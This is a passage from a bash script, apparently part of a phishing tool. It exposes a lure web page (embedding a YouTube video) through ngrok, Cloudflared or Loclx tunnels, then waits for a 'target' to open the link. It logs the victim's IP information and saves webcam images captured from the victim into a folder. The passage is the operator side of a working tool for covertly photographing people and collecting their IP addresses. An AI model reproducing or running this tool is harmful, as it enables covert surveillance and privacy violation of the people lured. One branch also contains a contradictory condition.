         if curl -s -N "https://www.youtube.com/embed/${vid_id}?autoplay=1" | grep -q "https://www.youtube.com/watch?v=${vid_id}"; then
              sed -i s/"6hHmkInZkMQ"/"$vid_id"/g index.html
         else
              echo -e "${error}Inavlid youtube video ID!. Using default value.\007\n"
         fi
    fi
fi
ngroklink=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z.]*.ngrok.io")
if ! [ -z "$ngroklink" ]; then
    ngrokcheck=true
else
    ngrokcheck=false
fi
for second in {1..10}; do
    if [ -f "$tunneler_dir/cf.log" ]; then
        cflink=$(grep -o "https://[-0-9a-z]*.trycloudflare.com" "$tunneler_dir/cf.log")
        sleep 1
    fi
    if ! [ -z "$cflink" ]; then
        cfcheck=true
        break
    else
        cfcheck=false
    fi
done
for second in {1..10}; do
    if [ -f "$tunneler_dir/loclx.log" ]; then
        loclxlink=$(grep -o "[-0-9a-z]*\.loclx.io" "$tunneler_dir/loclx.log")
        sleep 1
    fi
    if ! [ -z "$loclxlink" ]; then
        loclxcheck=true
        loclxlink="https://${loclxlink}"
        break
    else
        loclxcheck=false
    fi
done
if ( $ngrokcheck && $cfcheck && $loclxcheck ); then
    echo -e "${success}Ngrok, Cloudflared and Loclx have started successfully!\n"
    url_manager "$cflink" 1 2
    url_manager "$ngroklink" 3 4
    url_manager "$loclxlink" 5 6
elif ( $ngrokcheck && $cfcheck &&  ! $loclxcheck ); then
    echo -e "${success}Ngrok and Cloudflared have started successfully!\n"
    url_manager "$cflink" 1 2
    url_manager "$ngroklink" 3 4
elif ( $ngrokcheck && $loclxcheck &&  ! $cfcheck ); then
    echo -e "${success}Ngrok and Loclx have started successfully!\n"
    url_manager "$ngroklink" 1 2
    url_manager "$loclxlink" 3 4
elif ( $cfcheck && $loclxcheck &&  ! $loclxcheck ); then
    echo -e "${success}Cloudflared and Loclx have started successfully!\n"
    url_manager "$cflink" 1 2
    url_manager "$loclxlink" 3 4
elif ( $ngrokcheck && ! $cfcheck &&  ! $loclxcheck ); then
    echo -e "${success}Ngrok has started successfully!\n"
    url_manager "$ngroklink" 1 2
elif ( $cfcheck &&  ! $ngrokcheck &&  ! $loclxcheck ); then
    echo -e "${success}Cloudflared has started successfully!\n"
    url_manager "$cflink" 1 2
elif ( $loclxcheck && ! $ngrokcheck &&  ! $cfcheck ); then
    echo -e "${success}Loclx has started successfully!\n"
    url_manager "$loclxlink" 1 2
else
    echo -e "${error}Tunneling failed! Start your own port forwarding/tunneling service at port ${PORT}\n";
fi
sleep 1
rm -rf ip.txt
echo -e "${info}Waiting for target. ${cyan}Press ${red}Ctrl + C ${cyan}to exit...\n"
while true; do
    if [[ -e "ip.txt" ]]; then
        echo -e "\007${success}Target opened the link!\n"
        while IFS= read -r line; do
            echo -e "${green}[${blue}*${green}]${yellow} $line"
        done < ip.txt
        echo ""
        cat ip.txt >> "$cwd/ip.txt"
        rm -rf ip.txt
    fi
    sleep 0.5
    if [[ -e "log.txt" ]]; then
        echo -e "\007${success}Image downloaded! Check directory!\n"
        file=`ls | grep png`
        mv -f $file $FOL
        rm -rf log.txt
    fi
    sleep 0.5
done

